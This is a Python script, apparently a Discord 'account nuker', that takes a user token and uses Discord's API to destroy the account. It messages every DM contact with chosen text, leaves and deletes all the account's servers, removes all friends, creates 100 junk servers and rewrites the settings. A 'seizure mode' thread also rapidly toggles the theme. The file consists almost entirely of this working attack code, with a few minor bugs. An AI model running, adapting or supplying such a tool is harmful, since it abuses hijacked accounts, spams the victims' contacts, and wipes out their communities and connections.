import os
import sys
import time
import requests
import os.path
import threading
import random
from itertools import cycle

from pystyle import Colors


def main():
    pass

def setTitle(title):
    os.system(f"title {title}")

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')


def accnuke():
    def nuke(usertoken, server_name, message_content):
        if threading.active_count() <= 100:
            t = threading.Thread(target=custom_seizure, args=(usertoken, ))
            t.start()

        headers = {'Authorization': usertoken}
        channel_ids = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers).json()
        print(f"\nSent a message to all available friends")
        for channel in channel_ids:
            try:
                requests.post(f'https://discord.com/api/v9/channels/{channel['id']}/messages',
                headers=headers,
                data={"content": f"{message_content}"})
                print(f"\tMessaged ID: {channel['id']}")
            except Exception as e:
                print(f"\tEncountered an error and ignored it: {e}")

        print(f"\nLeft all available guilds")
        guild_ids = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers).json()
        for guild in guild_ids:
            try:
                requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{guild['id']}', headers=headers)
                print(f"\tLeft guild: {guild['name']}")
            except Exception as e:
                print(f"\tEncountered an error and ignored it: {e}")

        print(f"\nDeleted all available guilds")
        for guild in guild_ids:
            try:
                requests.delete(f'https://discord.com/api/v9/guilds/{guild['id']}', headers=headers)
                print(f'\tDeleted guild: {guild['name']}')
            except Exception as e:
                print(f"\tEncountered an error and ignored it: {e}")

        print(f"\nRemoved all available friends")
        friend_ids = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers).json()
        for friend in friend_ids:
            try:
                requests.delete(f'https://discord.com/api/v9/users/@me/relationships/{friend['id']}', headers=headers)
                print(f"\tRemoved friend: {friend['user']['username']}#{friend['user']['discriminator']}")
            except Exception as e:
                print(f"\tEncountered an error and ignored it: {e}")

        print(f"\nCreated all servers")
        for i in range(100):
            try:
                payload = {'name': f'{server_name}', 'region': 'europe', 'icon': None, 'channels': []}
                response = requests.post('https://discord.com/api/v9/guilds', headers=headers, json=payload)
                if response.status_code == 201:
                    print(f"\tCreated {server_name} #{i}")
                else:
                    print(f"\tFailed to create server {server_name} #{i}: {response.text}")
            except Exception as e:
                print(f"\tEncountered an error and ignored it: {e}")

        t.do_run = False
        settings = {
            'theme': "light",
            'locale': "ja",
            'message_display_compact': False,
            'inline_embed_media': False,
            'inline_attachment_media': False,
            'gif_auto_play': False,
            'render_embeds': False,
            'render_reactions': False,
            'animate_emoji': False,
            'convert_emoticons': False,
            'enable_tts_command': False,
            'explicit_content_filter': '0',
            'status': "idle"
        }
        requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=settings)
        user_data = requests.get("https://discordapp.com/api/v9/users/@me", headers=headers).json()
        username = user_data['username'] + "#" + user_data['discriminator']
        print(f"\nSuccessfully turned {username} into a troll")
        input(f"\nPress ENTER to exit")
        
    def custom_seizure(token):
        print(f'Starting seizure mode (Switching on/off Light/Dark mode)')
        t = threading.currentThread()
        while getattr(t, "do_run", True):
            modes = cycle(["light", "dark"])
            settings = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
            requests.patch("https://discord.com/api/v9/users/@me/settings", headers={'Authorization': usertoken}, json=settings)

    server_name = str(input(f'{Colors.red} Enter the name of servers to be created: '))
    message_content = str(input(f'{Colors.red} Message to send to each friend: '))
    response = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': usertoken})
    threads = 100

    if threading.active_count() < threads:
        threading.Thread(target=nuke, args=(usertoken, server_name, message_content)).start()
        return

if __name__ == "__main__":
    clear()
    global usertoken
    usertoken = str(input(f"{Colors.red}Token: "))
    accnuke()

if __name__ == "__main__":
    main()
